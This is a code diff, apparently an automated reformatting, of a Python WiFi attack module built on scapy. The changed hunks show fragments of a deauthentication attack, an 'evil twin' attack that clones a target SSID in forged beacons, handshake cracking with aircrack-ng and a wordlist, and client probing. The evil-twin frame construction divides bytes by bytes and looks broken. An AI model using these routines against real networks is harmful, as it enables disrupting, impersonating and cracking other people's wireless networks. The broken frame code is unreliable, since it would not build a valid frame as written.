@@ -11,6 +11,7 @@ Provides WiFi attack capabilities for authorized security testing:
     Unauthorized access to computer networks is illegal. Always obtain
     written authorization before performing any security testing.
 """
+
 import asyncio
 import os
 import subprocess
@@ -21,9 +22,19 @@ from backend.core.logger import log as logger
 
 try:
     from scapy.all import (
-        Dot11, Dot11Deauth, Dot11Beacon, Dot11ProbeReq, Dot11ProbeResp,
-        RadioTap, sendp, sniff, conf, wrpcap, rdpcap
+        Dot11,
+        Dot11Deauth,
+        Dot11Beacon,
+        Dot11ProbeReq,
+        Dot11ProbeResp,
+        RadioTap,
+        sendp,
+        sniff,
+        conf,
+        wrpcap,
+        rdpcap,
     )
+
     SCAPY_AVAILABLE = True
 except ImportError:
     SCAPY_AVAILABLE = False
@@ -31,6 +42,7 @@ except ImportError:
 
 try:
     import psutil
+
     PSUTIL_AVAILABLE = True
 except ImportError:
     PSUTIL_AVAILABLE = False
@@ -51,19 +63,22 @@ def _get_wireless_interfaces() -> list[dict]:
         return interfaces
 
     for name, stats in psutil.net_if_stats().items():
-        if stats.isup and ("wlan" in name or "wlp" in name or "ath" in name or "mon" in name):
-            interfaces.append({
-                "name": name,
-                "speed": stats.speed,
-                "mtu": stats.mtu,
-                "is_up": stats.isup,
-            })
+        if stats.isup and (
+            "wlan" in name or "wlp" in name or "ath" in name or "mon" in name
+        ):
+            interfaces.append(
+                {
+                    "name": name,
+                    "speed": stats.speed,
+                    "mtu": stats.mtu,
+                    "is_up": stats.isup,
+                }
+            )
 
     # Also check for monitor mode interfaces
     try:
         result = subprocess.run(
-            ["iw", "dev"],
-            capture_output=True, text=True, timeout=5
+            ["iw", "dev"], capture_output=True, text=True, timeout=5
         )
         if result.returncode == 0:
             current_iface = None
@@ -73,13 +88,15 @@ def _get_wireless_interfaces() -> list[dict]:
                     current_iface = line.split()[-1]
                 if "monitor" in line.lower() and current_iface:
                     if not any(i["name"] == current_iface for i in interfaces):
-                        interfaces.append({
-                            "name": current_iface,
-                            "mode": "monitor",
-                            "speed": 0,
-                            "mtu": 1500,
-                            "is_up": True,
-                        })
+                        interfaces.append(
+                            {
+                                "name": current_iface,
+                                "mode": "monitor",
+                                "speed": 0,
+                                "mtu": 1500,
+                                "is_up": True,
+                            }
+                        )
     except (FileNotFoundError, subprocess.TimeoutExpired):
         pass
 
@@ -100,7 +117,9 @@ async def scan_networks(interface: str, duration: int = 10) -> list[dict]:
             bssid = pkt[Dot11].addr2
             if bssid and ssid not in networks:
                 try:
-                    dbm = pkt[RadioTap].dBm_AntSignal if pkt.haslayer(RadioTap) else -100
+                    dbm = (
+                        pkt[RadioTap].dBm_AntSignal if pkt.haslayer(RadioTap) else -100
+                    )
                 except Exception:
                     dbm = -100
                 networks[ssid] = {
@@ -175,7 +194,9 @@ async def deauth_attack(
         return {"success": False, "error": "scapy not available"}
 
     attack_id = f"deauth_{int(time.time())}"
-    logger.warning(f"[WIFI-ATK] Deauth attack {attack_id}: {target_bssid} client={target_client}")
+    logger.warning(
+        f"[WIFI-ATK] Deauth attack {attack_id}: {target_bssid} client={target_client}"
+    )
 
     try:
         # Build deauth frame
@@ -238,7 +259,9 @@ async def evil_twin_attack(
         return {"success": False, "error": "scapy not available"}
 
     attack_id = f"evil_twin_{int(time.time())}"
-    logger.warning(f"[WIFI-ATK] Evil twin attack {attack_id}: cloning SSID '{target_ssid}'")
+    logger.warning(
+        f"[WIFI-ATK] Evil twin attack {attack_id}: cloning SSID '{target_ssid}'"
+    )
 
     try:
         # Create beacon frame for evil twin
@@ -255,11 +278,9 @@ async def evil_twin_attack(
         rates_elem = b"\x01\x08\x82\x84\x8b\x96\x0c\x12\x18\x24"
 
         frame = (
-            RadioTap()
-            / dot11
-            / beacon
-            / b"\x00" + bytes([len(target_ssid)]) + target_ssid.encode()
-            / rates_elem
+            RadioTap() / dot11 / beacon / b"\x00"
+            + bytes([len(target_ssid)])
+            + target_ssid.encode() / rates_elem
         )
 
         # Send beacon frames
@@ -401,7 +422,9 @@ async def crack_handshake(
         result = await asyncio.to_thread(
             subprocess.run,
             ["aircrack-ng", "-w", wordlist, capture_file],
-            capture_output=True, text=True, timeout=300,
+            capture_output=True,
+            text=True,
+            timeout=300,
         )
 
         output = result.stdout
@@ -436,7 +459,9 @@ async def crack_handshake(
         return {"success": False, "error": str(e)}
 
 
-async def probe_clients(interface: str, target_bssid: str, duration: int = 10) -> list[dict]:
+async def probe_clients(
+    interface: str, target_bssid: str, duration: int = 10
+) -> list[dict]:
     """Probe for clients connected to a specific AP."""
     if not SCAPY_AVAILABLE:
         return []
@@ -449,11 +474,19 @@ async def probe_clients(interface: str, target_bssid: str, duration: int = 10) -
             bssid = pkt[Dot11].addr3
             client_mac = pkt[Dot11].addr2
             if bssid and client_mac and bssid.lower() == target_bssid.lower():
-                ssid = pkt[Dot11ProbeReq].info.decode(errors="ignore") if pkt[Dot11ProbeReq].info else ""
+                ssid = (
+                    pkt[Dot11ProbeReq].info.decode(errors="ignore")
+                    if pkt[Dot11ProbeReq].info
+                    else ""
+                )
                 clients[client_mac] = {
                     "mac": client_mac,
                     "probing_ssid": ssid,
-                    "signal": getattr(pkt[RadioTap], 'dBm_AntSignal', -100) if pkt.haslayer(RadioTap) else -100,
+                    "signal": (
+                        getattr(pkt[RadioTap], "dBm_AntSignal", -100)
+                        if pkt.haslayer(RadioTap)
+                        else -100
+                    ),
                 }
 
     try:
